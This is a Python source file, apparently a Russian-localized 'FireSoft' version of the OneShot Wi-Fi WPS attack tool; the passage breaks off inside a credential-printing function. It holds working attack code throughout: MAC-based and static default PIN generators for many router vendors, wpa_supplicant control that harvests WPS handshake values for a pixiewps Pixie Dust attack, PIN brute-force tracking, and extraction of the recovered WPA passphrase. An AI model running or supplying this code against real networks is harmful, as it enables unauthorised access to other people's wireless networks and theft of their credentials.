#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import subprocess
import os
import tempfile

# FireSoft >
import colorama
from colorama import Fore, Back, Style
from colorama import just_fix_windows_console
from colorama import init
import platform
import distro
# < FireSoft

import shutil
import re
import codecs
import socket
import pathlib
import time
import datetime
from datetime import datetime
import datetime
import collections
import statistics
import csv
from typing import Dict


just_fix_windows_console()
init(autoreset=True)

def Check_System_GET_OS():
    system = platform.system()
    
    if system == "Linux":
        # Для получения информации о дистрибутиве Linux
        distro_info = f"{distro.name()} {distro.version()}"
        return f"{distro_info}"
    elif system == "Windows":
       
        version = platform.version()
        return f"Win \ {version}"
    else:
        return f"OS \ {system}"




print(f"| < {Fore.YELLOW}Fire{Fore.LIGHTRED_EX}Soft{Fore.RESET} - {Fore.LIGHTCYAN_EX}OneShotPin {Fore.LIGHTGREEN_EX}WPS{Fore.RESET}")
print(f"| - Перевод от {Fore.YELLOW}Fire{Fore.LIGHTRED_EX}Soft{Fore.RESET}")
print(f"| - Ваш дистрибутив: {Fore.LIGHTCYAN_EX}{Check_System_GET_OS()}{Fore.RESET}")
print(f"| > {Fore.LIGHTMAGENTA_EX}0.0.51 - 2024.06 {Fore.YELLOW}BETA{Fore.RESET}")



class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
                      # Static pin algos
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}

    @staticmethod
    def checksum(pin):
        """
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        """
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Недопустимый алгоритм WPS PIN')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC as list
        """
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        """
        Get all suggested WPS pin's for single MAC
        """
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        """
        Get all suggested WPS pin's for single MAC as list
        """
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        Returns the algo ID
        """
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        # Get the NIC part
        nic = mac.integer & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):

        self.start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()   # Last PIN attempt start time
        self.attempts_times = collections.deque(maxlen=15)

        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} {Fore.LIGHTBLUE_EX}{percentage:.2f}%{Fore.RESET} Выполнено @ {self.start_time} ({Fore.YELLOW}{average_pin_time:.2f}{Fore.RESET} seconds/pin)")



    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


class Companion:
    """Main application part"""
    def __init__(self, interface, save_result=False, print_debug=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = WPSpin()

    def __init_wpa_supplicant(self):
        print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Running wpa_supplicant…')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        # Waiting for wpa_supplicant control interface initialization
        while not os.path.exists(self.wpas_ctrl_path):
            pass

    def sendOnly(self, command):
        """Sends command to wpa_supplicant"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    def _explain_wpas_not_ok_status(command: str, respond: str):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Отправка WPS сообщения {Fore.LIGHTBLUE_EX}M{n}{Fore.RESET}…')
            elif 'Received M' in line:
                received_m_value = line.split('Received M')[1].strip()
                if received_m_value.isdigit():
                    n = int(received_m_value)
                    self.connection_status.last_m_message = n
                    print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Получено сообщение WPS {Fore.LIGHTBLUE_EX}M{n}{Fore.RESET}')
                    if n == 5:
                        print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} Первая половина PIN-кода действительна.')
                else:
                    print(f"Ошибка при получении значения M из строки: {received_m_value} | ERR_WPS_Rec_M")
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Получено WSC NACK.')
                print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}-{Fore.GREEN}]{Fore.RESET} Error: Неверный PIN-код')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Сканирование…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}-{Fore.GREEN}]{Fore.RESET} {Fore.LIGHTBLUE_EX}wpa_supplicant{Fore.RESET} вернул {Fore.LIGHTRED_EX}WPS-FAIL{Fore.RESET}')
#        elif 'NL80211_CMD_DEL_STATION' in line:
#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} {Fore.LIGHTYELLOW_EX}Аутентификация...{Fore.RESET}')
        elif 'Authentication response' in line:
            print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} {Fore.GREEN}Прошла аутентификация{Fore.RESET}')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Ассоциирование с точкой доступа ({Fore.LIGHTYELLOW_EX}AP{Fore.RESET})...')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} Ассоциирован с {Fore.YELLOW}{bssid}{Fore.RESET} (ESSID: {Fore.LIGHTBLUE_EX}{self.connection_status.essid}{Fore.RESET})')
            else:
                print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} Ассоциирован с {Fore.YELLOW}{bssid}{Fore.RESET}')
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Отправка {Fore.LIGHTBLUE_EX}EAPOL{Fore.RESET} Start…')
        elif 'EAP entering state IDENTITY' in line:
            print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Получен запрос на идентификацию')
        elif 'using real identity' in line:
            print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Отправка ответа на запрос идентификации...')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            print(f'{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Выбрана точка доступа ({Fore.YELLOW}AP{Fore.RESET}): {Fore.YELLOW}{bssid}{Fore.RESET}')

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}*{Fore.GREEN}]{Fore.RESET} Запуск {Fore.LIGHTBLUE_EX}Pixiewps{Fore.RESET}…")
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    return pin
        return False


    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None, bssid=None):
        #FireSoft >

        print(f"{Fore.LIGHTMAGENTA_EX}[{Fore.YELLOW}F{Fore.LIGHTRED_EX}S{Fore.LIGHTMAGENTA_EX}]{Fore.RESET} Получение настроек... ")


        #--- Settgins --->
        OS_Target = "NetHunter"   # NetHunter / Kali 
        Hide_Password_AP = "False" # Прятает пароль на выводе экарана(Print()), да - True, нет - False, на половину - Half
        Hide_Pin_AP = "False" # Прятает pin на выводе экарана(Print()), да - True, нет - False, на половину - Half
        #--- Settings ---<


        
        
        if Hide_Pin_AP == "True":
            Hiden_WPS_PIN = '*' * len(wps_pin)
            print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} WPS PIN: '{Fore.LIGHTGREEN_EX}{Hiden_WPS_PIN}{Fore.RESET}'")
        elif Hide_Pin_AP == "Half":
            half_length = len(wps_pin) // 2
            Hiden_Half_WPS_PIN = '*' * half_length + wps_pin[half_length:]
            print(f"{Fore.GREEN}[{Fore.LIGHTCYAN_EX}+{Fore.GREEN}]{Fore.RESET} WPS PIN: '{Fore.LIGHTGREEN_EX}{Hiden_Half_WPS_PIN}{Fore.RESET}'")
        else:
